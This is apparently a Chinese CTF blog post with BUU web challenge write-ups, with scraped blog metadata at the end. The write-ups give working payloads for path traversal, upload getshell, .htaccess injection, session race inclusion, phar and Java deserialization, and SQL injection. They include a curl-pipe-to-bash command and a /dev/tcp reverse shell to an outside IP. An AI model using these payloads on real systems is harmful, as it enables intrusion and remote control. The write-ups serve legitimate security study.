header(“Accept-Ranges: bytes”); header(“Accept-Length: “ . filesize($file_dir . “/“ . $file_name)); header(‘Content-Transfer-Encoding: binary’); header(“Content-Disposition: attachment; filename=” . $file_name); //以真实文件名提供给浏览器下载 header(‘Pragma: no-cache’); header(‘Expires: 0’); //输出文件内容 echo fread($file, filesize($file_dir . “/“ . $file_name)); fclose($file); exit; } }/manage/Backup/downloadBak?file=../../../../../../flag.txt 二、后台文件上传GetShell位置：application/admin/controller/Plugs.php上传的时候会先调用 upstate public function upstate() { $post = $this-&gt;request-&gt;post(); $filename = join(&#39;/&#39;, str_split($post[&#39;md5&#39;], 16)) . &#39;.&#39; . pathinfo($post[&#39;filename&#39;], 4); // 检查文件是否已上传 if (($site_url = FileService::getFileUrl($filename))) { $this-&gt;result([&#39;site_url&#39; =&gt; $site_url], &#39;IS_FOUND&#39;); } // 需要上传文件，生成上传配置参数 $config = [&#39;uptype&#39; =&gt; $post[&#39;uptype&#39;], &#39;file_url&#39; =&gt; $filename]; switch (strtolower($post[&#39;uptype&#39;])) { case &#39;qiniu&#39;: $config[&#39;server&#39;] = FileService::getUploadQiniuUrl(true); $config[&#39;token&#39;] = $this-&gt;_getQiniuToken($filename); break; case &#39;local&#39;: $config[&#39;server&#39;] = FileService::getUploadLocalUrl(); $config[&#39;token&#39;] = md5($filename . session_id()); break; case &#39;oss&#39;: $time = time() + 3600; $policyText = [ &#39;expiration&#39; =&gt; date(&#39;Y-m-d&#39;, $time) . &#39;T&#39; . date(&#39;H:i:s&#39;, $time) . &#39;.000Z&#39;, &#39;conditions&#39; =&gt; [[&#39;content-length-range&#39;, 0, 1048576000]], ]; $config[&#39;policy&#39;] = base64_encode(json_encode($policyText)); $config[&#39;server&#39;] = FileService::getUploadOssUrl(); $config[&#39;site_url&#39;] = FileService::getBaseUriOss() . $filename; $config[&#39;signature&#39;] = base64_encode(hash_hmac(&#39;sha1&#39;, $config[&#39;policy&#39;], sysconf(&#39;storage_oss_secret&#39;), true)); $config[&#39;OSSAccessKeyId&#39;] = sysconf(&#39;storage_oss_keyid&#39;); } $this-&gt;result($config, &#39;NOT_FOUND&#39;); } 主要作用如下：1、将通过 POST 传入的 md5 值以16位字母为间隔进行分割，并拼接传入filename 的后缀2、检测文件是否上传3、生成 config 数组，并添加每一个键的值 之后调用 upload ，这里看文件上传处理的位置（359行 public function upload() { $file = $this-&gt;request-&gt;file(‘file’); $ext = strtolower(pathinfo($file-&gt;getInfo(‘name’), 4)); $md5 = str_split($this-&gt;request-&gt;post(‘md5’), 16); $filename = join(‘/‘, $md5) . “.{$ext}”; if (strtolower($ext) == ‘php’ || !in_array($ext, explode(‘,’, strtolower(sysconf(‘storage_local_exts’))))) { return json([‘code’ =&gt; ‘ERROR’, ‘msg’ =&gt; ‘文件上传类型受限’]); } // 文件上传Token验证 if ($this-&gt;request-&gt;post(‘token’) !== md5($filename . session_id())) { return json([‘code’ =&gt; ‘ERROR’, ‘msg’ =&gt; ‘文件上传验证失败’]); } // 文件上传处理 if (($info = $file-&gt;move(‘static’ . DS . ‘upload’ . DS . $md5[0], $md5[1], true))) { if (($site_url = FileService::getFileUrl($filename, ‘local’))) { return json([‘data’ =&gt; [‘site_url’ =&gt; $site_url], ‘code’ =&gt; ‘SUCCESS’, ‘msg’ =&gt; ‘文件上传成功’]); } } return json([&#39;code&#39; =&gt; &#39;ERROR&#39;, &#39;msg&#39; =&gt; &#39;文件上传失败&#39;]); } 跟进 move，这里弟弟用的notepad，搜了半天。 // 文件保存命名规则 $saveName = $this-&gt;buildSaveName($savename); $filename = $path . $saveName;跟进 buildSaveName if (!strpos($savename, ‘.’)) { $savename .= ‘.’ . pathinfo($this-&gt;getInfo(‘name’), PATHINFO_EXTENSION); } return $savename; 关键点就在 最后一个if判断上 判断 $savename里是否有. 有的话就会直接 return $savename看前面的调用发现 这个savename就是 调用move函数的第二个参数 也就是 $md5[1]：move(‘static’ . DS . ‘upload’ . DS . $md5[0], $md5[1], true))经过buildSaveName($savename)后会直接返回$md5[1]，然后拼接在$path的后面做为文件名，后面直接调用move_uploaded_file()将文件移动到$path，在这个过程中$ma5[1]是可控的，所以我们可以直接上传php文件。首先生成带木马的图片，然后生成token值，php &gt; echo md5(“aa”);4124bc0a9335c27f086f24ba207a4912echo md5(“4124bc0a9335c27f/086f24ba207a.php.png”);bf9b89e7c8f5f1159d8bd7aaaa9c795d postman构造请求包发送即可参考链接：https://www.anquanke.com/post/id/224207（建议直接看这个 [羊城杯2020]easyphp关键词：htaccess头文件包含这题看着就觉得奇怪，写了一堆waf不是直接往index.php写个马不就行了？但是没写进去，应该是没有权限。没权写index，那就只能想别的办法了（除了index都会被删除方法：利用.htaccess设置文件自动包含.htaccess也可以设置开头自动包含，.htaccess设置php环境变量的格式： #formatphp_value setting_name setting_value #examplephp_value auto_prepend_file .htaccess所以传参?filename=.htaccesscontent有过滤 需要先绕过 $content = $_GET[‘content’]; if(stristr($content,’on’) || stristr($content,’html’) || stristr($content,’type’) || stristr($content,’flag’) || stristr($content,’upload’) || stristr($content,’file’)) { echo “Hacker”; die();可以通过对过滤的关键字中间添加换行\\n来绕过stristr函数的检测，不过仍然需要注意添加\\来转义掉换行，这样才不会出现语法错误，如此一来就不需要再绕过preg_match函数，即可直接写入.htaccess来getshell?content=php_value%20auto_prepend_fil\\%0ae%20.htaccess%0a%23&lt;?php%20system(‘cat%20/fla’.’g’);?&gt;\\&amp;filename=.htaccess写入内容：php_value auto_prepend_fil\\e .htaccess #&lt;?php system(‘cat /fla’.’g’);?&gt;\\ 用filter流base64decode content中内容也可以绕过 [WMCTF2020]Make PHP Great Again预期解：require_once 绕过不能重复包含文件的限制在php中，require_once在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含。所以我们要读取flag.php，必须绕过这个限制。原理解析：https://www.anquanke.com/post/id/213235；https://blog.frankli.site/2020/08/05/WMCTF2020-PHP-source-analysis/payload：php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php/proc/self/root只能多不能少，原理见链接2。 非预期1：?file=php://filter/convert.base64-encode/resource=/Troy3e/../proc/self/cwd/flag.php附所有proc解析：https://blog.csdn.net/weixin_37778713/article/details/106130248非预期2：利用session.upload_progress进行文件包含在PHP&gt;5.4，session.upload_progress.enabled这个参数在php.ini中默认开启，在上传的过程中会生成上传进度文件，PHP将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ，它的存储路径可以在phpinfo中查到.可以利用session.upload_progress将恶意语句写入session文件，再去利用竞争在session清空前包含session文件，达到Getshell的目的。exp： #coding=utf-8 import io import requests import threading sessid = &#39;peri0d&#39; data = {&quot;cmd&quot;:&quot;system(&#39;whoami&#39;);&quot;} def write(session): while True: f = io.BytesIO(b&#39;a&#39; * 1024 * 50) resp = session.post( &#39;http://5bee85f4-0831-4fcf-a4c2-f33a607684b0.node3.buuoj.cn/&#39;, data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;}, files={&#39;file&#39;: (&#39;peri0d.txt&#39;,f)}, cookies={&#39;PHPSESSID&#39;: sessid} ) def read(session): while True: resp = session.post(&#39;http://5bee85f4-0831-4fcf-a4c2-f33a607684b0.node3.buuoj.cn/?file=/tmp/sess_&#39;+sessid,data=data) if &#39;peri0d.txt&#39; in resp.text: print(resp.text) event.clear() else: print(&#39;++++++++++++++++&#39;) if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in xrange(1,30): threading.Thread(target=write,args=(session,)).start() for i in xrange(1,30): threading.Thread(target=read,args=(session,)).start() event.set() 神仙 膜了 https://blog.csdn.net/weixin_48537150/article/details/113189052 [SUCTF 2019]Upload Labs 2关键词：phar反序列化给了admin.php源码，rce需要本地IP，由于是remoteaddr，无法直接伪造，所以得寻找ssrf的点。class.php里wakeup函数里有个ReflectionClass类，报告了一个类的有关信息。接下来会调用newInstanceArgs函数，查阅官方文档可知此函数从给出的参数创建一个新的类实例。也就是可以实例化任何类。思路：上传一个phar文件，在func.php读取该文件，getMIME()触发phar反序列化，从而调用SoapClient类，成功伪造IP。exp： &lt;?php $phar = new Phar(&#39;troy3e.phar&#39;); $phar-&gt;startBuffering(); $phar-&gt;addFromString(&#39;text.txt&#39;,&#39;text&#39;); $phar-&gt;setStub(&#39;&lt;script language=&quot;php&quot;&gt;__HALT_COMPILER();&lt;/script&gt;&#39;); //bypass class.php waf class File { public $file_name = &quot;&quot;; public $func = &quot;SoapClient&quot;; function __construct(){ $target = &quot;http://127.0.0.1/admin.php&quot;; $post_string = &#39;admin=&amp;cmd=curl http://henuctf.com:5555/tmp/|bash&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\\r\\n&quot;; $headers = []; $this-&gt;file_name = [ null, array(&#39;location&#39; =&gt; $target, &#39;user_agent&#39;=&gt; str_replace(&#39;^^&#39;, &quot;\\r\\n&quot;, &#39;xxxxx^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;Content-Length: &#39;. (string)strlen($post_string).&#39;^^^^&#39;.$post_string), &#39;uri&#39;=&gt;&#39;hello&#39;) ]; } } $object = new File; echo urlencode(serialize($object)); $phar-&gt;setMetadata($object); $phar-&gt;stopBuffering(); buu环境有变，直接cmd那里弹shell即可。soapclient+CRLF参考：https://blog.csdn.net/qq_42181428/article/details/100569464 看了下官方WP，出题人本意似乎是想在admin.php的wakeup函数里提供flag获取方式，这样就需要新的姿势了出题人笔记：https://xz.aliyun.com/t/6057在wakeup里的话就需要去想方法触发反序列化了，这其实就对应了admin.php里面sql的奇怪代码：$reflect = new ReflectionClass($this-&gt;clazz);$this-&gt;instance = $reflect-&gt;newInstanceArgs(); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func1);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg1); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func2);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg2); $reflectionMethod = new ReflectionMethod($this-&gt;clazz, $this-&gt;func3);$reflectionMethod-&gt;invoke($this-&gt;instance, $this-&gt;arg3); 分别对应了：$m = new mysqli();$m-&gt;init();$m-&gt;real_connect(‘ip’,’select 1’,’select 1’,’select 1’,3306);$m-&gt;query(‘select 1;’); 后面总结的话，就是mysql也会触发phar反序列化，那么 Rogue Mysql 的攻击当然适用于 phar 反序列化了。猛。 [SWPUCTF 2016]Web7关键词：python urllib头注入参考：https://guokeya.github.io/post/swpuctf-2016web7urllib-tou-zhu-ru-ssrf/很久之前的洞了，学习一下原理就行。input界面随手输个1报错：Powered by CherryPy 17.4.2调用了urllib2.open漏洞原理是urllib在解析url时。接受URL编码的值。会包含在HTTP数据流中。那么我们就可以通过%0d%0a去构造一个新的HTTP请求。通过urllib注入redis。修改admin密码https://blog.csdn.net/niexinming/article/details/53024755此题应该没什么意义了，年代过于久远。 [SWPU2019]Web6关键词：Mysql中的WITH ROLLUP用法；利用session.upload_progress进行文件包含和反序列化渗透参考: https://blog.csdn.net/lllffg/article/details/114899739?spm=1001.2014.3001.5501；https://guokeya.github.io/post/EY20O7D3Q/输入1’ or 1=1#显示wrong password，说明只会检测password（如果不检测的话就直接过了想起来前几天blackwatch那道题用的rollup，这里也尝试一下：1’ or ‘1’=’1’ group by passwd with rollup having passwd is NULL #根据官方提示wsdl.php，method=hint得到：a few file may be helpful index.php Service.php interface.php se.php显然可以用file_read方法读取源码。读取到除了Service.php的其他四个文件源码。调用get_flag提示需要admin以127.0.0.1访问，cookie中有一串加密的代码，通过逆向encode.php得到cookie值为xiaoC:1。（可以跳过伪造一个admin 加密一下是xZmdm9Nxag==。现在有了admin身份，还需要127.0.0.1ini_set(‘session.serialize_handler’, ‘php’); https://www.freebuf.com/vuls/202819.html；https://blog.spoock.com/2016/10/16/php-serialize-problem/?utm_source=tuicool&amp;utm_medium=referral由于在已给的四个源码里都没有找到get_flag类，所以猜测一定是存在于我们无法读取的Service.php。那么思路就是 先生成ssrf的paylaod，然后利用session.upload_progress打过去，再加上soapcilent触发ssrf 那么现在admin和127.0.0.1都有了。最后只需要利用se.php的反序列化call一下service.php的get_flag即可（芜湖~ 数据包：POST /index.ph HTTP/1.1Host: ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Connection: closeReferer: http://ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cn/index.phpCookie: PHPSESSID=troy3e;Content-Type: multipart/form-data; boundary=——–1995995913Content-Length: 440Connection: closeAccept-Encoding: gzip,deflate ———-1995995913Content-Disposition: form-data; name=”PHP_SESSION_UPLOAD_PROGRESS” |O:10:”SoapClient”:4:{s:3:”uri”;s:4:”aaab”;s:8:”location”;s:30:”http://127.0.0.1/interface.php”;s:11:”_user_agent”;s:60:”wupcoX-Forwarded-For: 127.0.0.1Cookie: user=xZmdm9NxaQ==”;s:13:”_soap_version”;i:1;}———-1995995913Content-Disposition: form-data; name=”file”; filename=”1.txt”Content-Type: text/plain ———-1995995913– 数据包2：POST /se.php HTTP/1.1Host: ba7f99ed-9458-4e45-953f-a28cd1dd7a5c.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=troy3e;Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 276 aa=O:2:&quot;bb&quot;:2:{s:4:&quot;mod1&quot;;O:2:&quot;aa&quot;:2:{s:4:&quot;mod1&quot;;N;s:4:&quot;mod2&quot;;a:1:{s:5:&quot;test2&quot;;O:2:&quot;cc&quot;:3:{s:4:&quot;mod1&quot;;O:2:&quot;ee&quot;:2:{s:4:&quot;str1&quot;;O:2:&quot;dd&quot;:3:{s:4:&quot;name&quot;;N;s:4:&quot;flag&quot;;s:8:&quot;Get_flag&quot;;s:1:&quot;b&quot;;s:14:&quot;call_user_func&quot;;}s:4:&quot;str2&quot;;s:7:&quot;getflag&quot;;}s:4:&quot;mod2&quot;;N;s:4:&quot;mod3&quot;;N;}}}s:4:&quot;mod2&quot;;N;} pop链比较简单就不写了，忘了的话看参考链接。数据包最好能自己python写了然后bp抓，这样记忆会更深。 [RoarCTF 2019]PHPShe关键词：CVE-2019-9762：phar反序列化没办法注册，直接刷掉了一堆网上的cve。但这个还能用：/include/plugin/payment/alipay/pay.php?id=pay%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12%23_ 用反引号是因为源码里插入就是反引号，这里的下划线大概是和本身传入的pay_2891314719这种格式有关，必须得加上。然后会发现burp回显3，不是很明显需要仔细点看。 把3换成database()得到phpshe2，然而接下来却无法直接注出表名，需要用到无列名注入：https://zhuanlan.zhihu.com/p/98206699 /include/plugin/payment/alipay/pay.php?id=pay%20where%201=1%20union%20select%201,2,((select3from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_得到2476bf5c8d3653e843b6ed42c0672b91解密altman777，成功登入后台。根据WP 说是在源码中的类文件进行了修改（可以用diffinity对比出来，几万行代码是不可能手动找的 public function __destruct() { $this-&gt;extract(PCLZIP_OPT_PATH, $this-&gt;save_path); } PCLZIP解压缩，然后将文件放在指定目录，同时品牌管理处又能上传zip文件，那么只要想办法触发即可。即在admin.php上传的压缩的一句话木马文件要触发这里的destruct。那么就从admin.php开始看，首先：include(‘common.php’);common.php 12行就有个变量覆盖 if (@ini_get(‘register_globals’)) { foreach ($_REQUEST as $name =&gt; $value) unset($$name); //这里没懂为啥会触发覆盖 } …… if (get_magic_quotes_gpc()) { //这函数恒为false，从7.4版本就被废弃。 !empty($_GET) &amp;&amp; extract(pe_trim(pe_stripslashes($_GET)), EXTR_PREFIX_ALL, ‘_g’); !empty($_POST) &amp;&amp; extract(pe_trim(pe_stripslashes($_POST)), EXTR_PREFIX_ALL, ‘_p’); } else { !empty($_GET) &amp;&amp; extract(pe_trim($_GET),EXTR_PREFIX_ALL,’_g’); !empty($_POST) &amp;&amp; extract(pe_trim($_POST),EXTR_PREFIX_ALL,’_p’);后面说是对变量加上前缀。进行处理。在前缀和键值中会加一个下划线。继续看。可以包含任意目录的php文件（其实早就已经看不懂了。。。if (in_array(“{$mod}.php”, pe_dirlist(“{$pe[‘path_root’]}module/{$module}/*.php”))) { include(“{$pe[‘path_root’]}module/{$module}/{$mod}.php”);}利用变量覆盖。包含admin目录下的moban.php（/module/admin/moban.php只有它引用了pclzip.class.php（罢了 这要是我一辈子找不着 看guoke师傅 wp就行了QAQswitch一个参数进入del： case ‘del’: pe_token_match(); $tpl_name = pe_dbhold($_g_tpl); if ($tpl_name == ‘default’) pe_error(‘默认模板不能删除…’); if ($db-&gt;pe_num(‘setting’, array(‘setting_key’=&gt;’web_tpl’, ‘setting_value’=&gt;$tpl_name))) { pe_error(‘使用中不能删除’); } else { pe_dirdel(“{$tpl_name}”); pe_success(‘删除成功!’); } break;pe_dirdel函数触发phar反序列化。 懂了，大致意思就是上传一个压缩的phar文件： &lt;?php class PclZip{ var $zipname = ‘’; var $zip_fd = 0; var $error_code = 1; var $error_string = ‘’; var $magic_quotes_status; var $save_path = ‘/var/www/html/data’;//解压目录 function __construct($p_zipname){ $this-&gt;zipname = $p_zipname; $this-&gt;zip_fd = 0; $this-&gt;magic_quotes_status = -1; return; } } $a=new PclZip(&quot;/var/www/html/data/attachment/brand/1.zip&quot;);//压缩的文件路径 echo serialize($a); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($a); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;troy3e&quot;); $phar-&gt;stopBuffering(); ?&gt; 目的是后面反序列化时（moban.php里的那个del触发）触发PclZip类，解压webshell的压缩文件然后写入我们指定的目录，完美。然后嘞，康康师傅的wp先~哦 还有一个注意点就是625行那个函数，需要传一个token，抓包即可获得。执行exp生成phar.phar然后修改后缀为可上传的任意后缀（txt上传webshell的压缩文件和phar.txt（burp抓包改上删文件触发反序列化GET /admin.php?mod=moban&amp;act=del&amp;token=07aeb0cfb9db219504d34f4edfa2a135&amp;tpl=phar:///var/www/html/data/attachment/brand/3.txt HTTP/1.1Host: 9515c71a-972b-419f-847a-eb166c73ba9b.node3.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeReferer: http://9515c71a-972b-419f-847a-eb166c73ba9b.node3.buuoj.cn/admin.php?mod=mobanCookie: UM_distinctid=178395fbb40cc-02783c99f63357-4c3f227c-1fa400-178395fbb417c4; PHPSESSID=pgqota5okm9rgj7s3oammmvu14Upgrade-Insecure-Requests: 1这里3.txt路径是可以在上传界面获得的参考：https://nikoeurus.github.io/2019/10/14/RoarCTF/#%E5%90%8E%E5%8F%B0getshellhttps://blog.csdn.net/mochu7777777/article/details/107550135https://guokeya.github.io/post/zE_m1kHQm/ 还是得多分析源码才能进步。 [V&amp;N2020 公开赛]EasySpringMVC关键词：Java反序列化Java反序列化没怎么仔细研究过 这两次比赛吃了很大的亏总结一篇博客学习一下 见 Java反序列化学习.mdhttp://1cd4a2bb-5036-4365-be52-3f7b33bbb5b8.node3.buuoj.cn/springmvcdemo/showpic.form?file=showpic.jsp上传图片点 需要webmanager组权限 file参数尝试任意文件读取显示only show you picture file !（失败开始审源码，拖到jdgui里首先看web.xml。（web.xml是J2EE定义的描述这个webapp的一个配置文件，非常重要。） &lt;?xml version=”1.0” encoding=”UTF-8”?&gt; contextConfigLocation /WEB-INF/applicationContext.xml org.springframework.web.context.ContextLoaderListener clientinfo com.filters.ClentInfoFilter clientinfo dispatcher org.springframework.web.servlet.DispatcherServlet 1 dispatcher .form 先看最下面一段： dispatcher .form 该配置文件用servlet-mapping指明所有.form格式路径的访问交给名为dispatcher的servlet处理。servlet就是处理HTTP请求的核心类。 dispatcher org.springframework.web.servlet.DispatcherServlet 1 再看这一段，表明这个dispatcher servlet是一个org.springframework.web.servlet.DispatcherServlet，也就是说这个webapp使用了Spring框架。比较有趣的是还定义了一个filter。 clientinfo com.filters.ClentInfoFilter clientinfo * 这段代码表示，对所有servlet的访问，都需要经过com.filters.ClentInfoFilter类。filter的作用一般是在HTTP请求到达servlet之前或之后，对HTTP请求或响应进行处理，比如检查这个请求是否拥有权限。controller类WP直接一句话带过说没有有问题的地方，当然我们学习的还是得自己看一遍。只有show类里面有个序列化 别的地方 upload不用看 index里面就是一些判断。接下来看上面提到的filter if (cookies != null) for (Cookie c : cookies) { if (c.getName().equals(“cinfo”)) { exist = true; cookie = c; break; } }可以看到filter首先从众多cookies中找到这个cinfo这个cookie。然后下面有：bytes = Tools.create(cinfo);跟进Tools类，芜湖！： private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } }Tools对这个字节数组直接readObject，进行反序列化操作！也就是说我们客户端提交的数据，服务器无条件信任，并反序列化。Java的反序列化和PHP反序列化类似，php在反序列化的时候会调用对应类的__wakeup()函数，而java会调用该类readObject()函数。如果我们构造一个Tools类，反序列化的时候，readObject会被自动调用，然后读到的obj会被强制类型转换为String[]，达到命令执行。由于反序列化的时候读取的对象直接被传入Processbuilder，我们在Tools类内重写writeObject方法，直接将命令写入。 Tools.class package com.tools;//一定要这个原文件同名的路径 import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.IOException; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; public class Tools implements Serializable { private static final long serialVersionUID = 1L; private String testCall; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); outputStream.writeObject(obj); outputStream.writeObject(obj); return bos.toByteArray(); outputStream.writeObject(obj); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } private void writeObject(ObjectOutputStream out) throws IOException,ClassNotFoundException { String[] cmd={&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i&gt;&amp; /dev/tcp/121.196.169.53/3333 0&gt;&amp;1&quot;}; out.writeObject(cmd); } } example3_1.class package example; import com.tools.Tools; import java.util.Base64; public class example3_1 { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { Tools cinfo = new Tools(); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e) { e.printStackTrace(); } } } [VNCTF 2021]realezjvavWP说笛卡尔积盲注 我偏不信 试了下别的方法 都不行 好吧 wsfw其实在注释里已经写了both username and password are right , then you can enter the next level所以不能admin\\这种。同时sleep benchmark都被过滤 而且没有回显 必须盲注 只能笛卡尔积试试了。原理：SELECT count() FROM information_schema.columns A,information_schema.columns B,information_schema.columns C;根据数据库查询的特点，这句话的意思就是将 A B C 三个表进行笛卡尔积（全排列），并输出 最终的行数，执行效果如下：执行效果是跑了十分钟都没跑出来 网上看了应该是 count() 六千多万光一个表的话是三千多 一下子就能出来。那么利用原理就是根据回显速度注入 和时间盲注一个原理(当然回显速度需要对payload进行调整)官方exp: import requests import time url = “http://cacbd0a9-16f5-497b-8346-dae9d466ddb4.node3.buuoj.cn/user/login” i = 0 flag = “” while True : i += 1 head = 32 tail = 126 while head &lt; tail : mid = head + tail &gt;&gt; 1 payload = “a’ or (if(ascii(substr(password,%d,1))&gt;%d,(SELECT//count(*)//FROM//information_schema.tables//A,information_schema.columns//B,information_schema.tables//C),1))#” % (i,mid) data = {“username”:”admin” , “password” : payload} start_time = time.time() r = requests.post(url,data = data) print(data[‘password’]) end_time = time.time() if end_time - start_time &gt; 3: head = mid + 1 else : tail = mid if head!=32: flag += chr(head) print(flag) else: break注的很慢 因为那语句大概要执行6秒钟密码no_0ne_kn0w_th1s进去是创建角色，查看图片路径：http://cacbd0a9-16f5-497b-8346-dae9d466ddb4.node3.buuoj.cn/searchimage?img=2.png怀疑存在任意文件读取，但是我不知道要读什么 自己随便试了一下：../../../../../../web.xml不行，查看wp：searchimage?img=../../../../../pom.xml？说是Spring里面pom.xml放了外部依赖，麻了。看到fastjson com.alibaba fastjson 1.2.27 rce：https://github.com/CaijiOrz/fastjson-1.2.47-RCE；https://y4tacker.blog.csdn.net/article/details/114949206flag_no_one_know_abccba.txt复现还算简单。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"BUU WebWP","slug":"BUU-WebWP","date":"2021-03-28T12:41:50.000Z","updated":"2021-03-28T12:43:59.595Z","comments":true,"path":"2021/03/28/BUU-WebWP/","link":"","permalink":"/2021/03/28/BUU-WebWP/","excerpt":"","text":"BUU以前做的Web合集：https://github.com/ITroyeSivan/BUUWebWP","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[{"name":"BUU","slug":"BUU","permalink":"/tags/BUU/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"Java反序列化学习","slug":"Java反序列化学习","date":"2021-03-25T08:03:39.000Z","updated":"2021-03-25T08:05:24.020Z","comments":true,"path":"2021/03/25/Java反序列化学习/","link":"","permalink":"/2021/03/25/Java反序列化学习/","excerpt":"","text":"这几天做了很多题 经验总结一句话就是：要多分析源码。Java一直没去深入研究 比赛的时候自己根本没法做 还是连续两场都碰上 非常后悔 从今往后分析平台源码也得加入每日学习内容了。进入正文—————————————————————————————————— Java反序列化有啥用?1)把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；2)在网络上传送对象的字节序列 Java中的API实现 Java.io.ObjectOutputStream&amp;&amp;Java.io.ObjectInputStream ObjectOutputStream类 –&gt; writeObject()该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中，按Java的标准约定是给文件一个.ser扩展名。想起来前几天补考Java才刚学过hhh打开eclipse试一下： package example; import java.io.*; public class example3_1{ public static void main(String args[]) throws Exception{ String obj = &quot;emt&quot;; // 将序列化对象写入文件object.txt中 FileOutputStream fos = new FileOutputStream(&quot;troy3e.ser&quot;); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(obj); os.close(); // 从文件object.txt中读取数据 FileInputStream fis = new FileInputStream(&quot;troy3e.ser&quot;); ObjectInputStream ois = new ObjectInputStream(fis); // 通过反序列化恢复对象obj String obj2 = (String)ois.readObject(); System.out.println(obj2); ois.close(); } } 先通过输入流创建一个文件，再调用ObjectOutputStream类的 writeObject方法把序列化的数据写入该文件;然后调用ObjectInputStream类的readObject方法反序列化数据并打印数据内容。对于类的话 实现Serializable和Externalizable接口的类的对象才能被序列化。（class Troy3e implements Serializable） 漏洞产生原因与PHP反序列化是一个道理，如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。 实战分析一、[V&amp;N2020 公开赛]EasySpringMVCWP本地记录。二、NepCTFWP本地记录。 持续更新。PS：WP以后会做一个合集，不再单发水博客。","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"博客暂时停更","slug":"WP暂时停更","date":"2021-03-16T03:17:25.000Z","updated":"2021-03-17T12:27:25.617Z","comments":true,"path":"2021/03/16/WP暂时停更/","link":"","permalink":"/2021/03/16/WP暂时停更/","excerpt":"","text":"接下来很长一段时间开始爆肝学习模式。由于刷题较多和更新博客比较耗费时间的问题 WP改为本地记录。等什么时候能拿出成绩了恢复更新。（不影响技术博客Troy3e 2021/3/16","categories":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}],"tags":[],"keywords":[{"name":"技术","slug":"技术","permalink":"/categories/技术/"}]},{"title":"渗透测试之信息收集","slug":"渗透测试之信息收集","date":"2021-03-13T05:42:09.000Z","updated":"2021-03-13T07:24:59.278Z","comments":true,"path":"2021/03/13/渗透测试之信息收集/","link":"","permalink":"/2021/03/13/渗透测试之信息收集/","excerpt":"","text":"#信息收集 